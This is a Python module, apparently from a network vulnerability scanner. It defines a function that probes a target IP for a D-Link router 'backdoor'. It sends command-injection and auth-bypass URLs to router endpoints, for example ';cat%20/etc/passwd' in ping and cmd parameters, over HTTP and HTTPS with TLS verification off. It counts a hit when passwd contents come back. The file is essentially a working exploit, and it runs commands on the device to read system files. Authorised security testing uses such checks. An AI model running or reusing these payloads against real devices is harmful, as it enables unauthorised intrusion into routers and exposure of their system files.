import requests
from lib.headers.headers_handler import user_agents
from lib.color_handler import print_colour

def dlink_backdoor(ip, ports=None, timeout=10):
    headers = {"User-Agent": user_agents()}
    if ports is None:
        ports = [80, 8080]
    else:
        ports = ports
    
    auth_bypass_paths = [
        "/command.php?cmd=cat%20/etc/passwd",
        "/diagnostic.php?act=ping&ipaddress=;cat%20/etc/passwd",
        "/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=cat%20/etc/passwd",
        "/apply.cgi?submit_button=Diagnostics&change_action=gozila_cgi&submit_type=start_ping&action=&commit=0&ping_ip=;cat%20/etc/passwd"
    ]
    
    success_patterns = ["root:", "bin:", "nobody:"]
    
    for port in ports:
        for proto in ["http", "https"]:
            for path in auth_bypass_paths:
                url = f"{proto}://{ip}:{port}{path}"
                try:
                    response = requests.get(url, headers=headers, verify=False, timeout=timeout)
                    if any(pattern in response.text for pattern in success_patterns):
                        print_colour(f"[+] D-Link backdoor detected: {url}")
                        return True
                except requests.RequestException:
                    continue
    return False